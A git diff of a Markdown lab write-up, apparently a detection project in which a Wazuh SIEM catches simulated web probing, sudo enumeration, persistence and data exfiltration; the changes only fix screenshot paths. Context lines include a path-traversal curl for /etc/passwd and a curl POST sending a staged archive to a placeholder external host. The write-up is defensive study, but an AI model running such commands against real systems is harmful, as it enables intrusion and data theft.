@@ -75,14 +75,14 @@ curl "http://192.168.56.20/../../../../etc/passwd"
 ```
 
 <!-- 📸 Screenshot: Nginx access log showing the suspicious probing requests -->
-![Nginx suspicious requests](./screenshots/03-web-attack/01-nginx-suspicious-requests.png)
+![Nginx suspicious requests](./screenshots/01-nginx-suspicious-requests.png)
 
 Almost all of these came back as 404s, since none of those paths or applications actually exist on this server. That's worth calling out directly: a 404 is not a non-event. It's still evidence that someone is actively fingerprinting your application surface, and a cluster of them from one source IP, hitting known-sensitive paths in a short window, is a meaningful signal on its own — long before any request actually succeeds.
 
 In Wazuh, filtering on the source IP and Nginx logs surfaced the requested URLs, response codes, and rule descriptions tied to web server errors.
 
 <!-- 📸 Screenshot: Wazuh rule detail for the web server error rule -->
-![Wazuh web rule details](./screenshots/03-web-attack/06-wazuh-web-rule-details.png)
+![Wazuh web rule details](./screenshots/06-wazuh-web-rule-details.png)
 
 **MITRE ATT&CK techniques observed:**
 - `T1190` — Exploit Public-Facing Application
@@ -99,14 +99,14 @@ systemctl status
 ```
 
 <!-- 📸 Screenshot: local auth.log entries showing the sudo commands executed -->
-![Local auth.log sudo commands](./screenshots/04-suspicious-command/01-local-authlog-sudo-commands.png)
+![Local auth.log sudo commands](./screenshots/01-local-authlog-sudo-commands.png)
 
 None of these are malicious in isolation. Every one of them is something a legitimate admin runs regularly. What made them worth flagging in this context was the combination and the sequence: privilege enumeration, followed by network reconnaissance, following directly after a brute-force and a round of web probing from the same source.
 
 Wazuh's sudo logging and command auditing surfaced these as discrete events, each mapped individually to MITRE ATT&CK.
 
 <!-- 📸 Screenshot: Wazuh sudo command events -->
-![Wazuh sudo events](./screenshots/04-suspicious-command/02-wazuh-sudo-events.png)
+![Wazuh sudo events](./screenshots/02-wazuh-sudo-events.png)
 
 **MITRE ATT&CK techniques observed:**
 - `T1548.003` — Sudo and Sudo Caching
@@ -120,7 +120,7 @@ Wazuh's sudo logging and command auditing surfaced these as discrete events, eac
 This stage is where Wazuh's FIM module did the most work. I simulated three common persistence techniques: adding a cron job under `/etc/cron.d/`, appending an SSH key to an `authorized_keys` file, and dropping a hidden file in `/tmp`.
 
 <!-- 📸 Screenshot: Wazuh FIM alert showing the authorized_keys diff -->
-![Wazuh authorized_keys FIM event](./screenshots/05-persistence/05-wazuh-authorized-keys-fim-event.png)
+![Wazuh authorized_keys FIM event](./screenshots/05-wazuh-authorized-keys-fim-event.png)
 
 The `authorized_keys` modification was caught immediately by syscheck, with a full diff of what changed — this was, by a clear margin, the cleanest and most confident detection across the entire project. Unlike log-based detections that require interpreting a pattern, FIM gave a direct, unambiguous "this specific file changed, here's exactly how."
 
@@ -141,12 +141,12 @@ curl -X POST -F "file=@staged_data.tar.gz" http://<external-host>/upload
 ```
 
 <!-- 📸 Screenshot: staging folder with the compressed archive -->
-![Staging folder archive created](./screenshots/06-exfiltration/03-staging-folder-archive-created.png)
+![Staging folder archive created](./screenshots/03-staging-folder-archive-created.png)
 
 The exfiltration attempt itself failed — there was no receiving server on the other end, so the POST request simply errored out. That's fine, and worth stating plainly rather than glossing over: the goal of this stage wasn't a successful exfiltration, it was generating the telemetry that precedes one. The staging, compression, and outbound transfer attempt are themselves the detectable behaviors, regardless of whether the transfer completes.
 
 <!-- 📸 Screenshot: Wazuh event for the curl outbound transfer attempt -->
-![Wazuh curl transfer attempt](./screenshots/06-exfiltration/08-wazuh-curl-transfer-attempt.png)
+![Wazuh curl transfer attempt](./screenshots/08-wazuh-curl-transfer-attempt.png)
 
 **MITRE ATT&CK techniques observed:**
 - `T1005` — Data from Local System
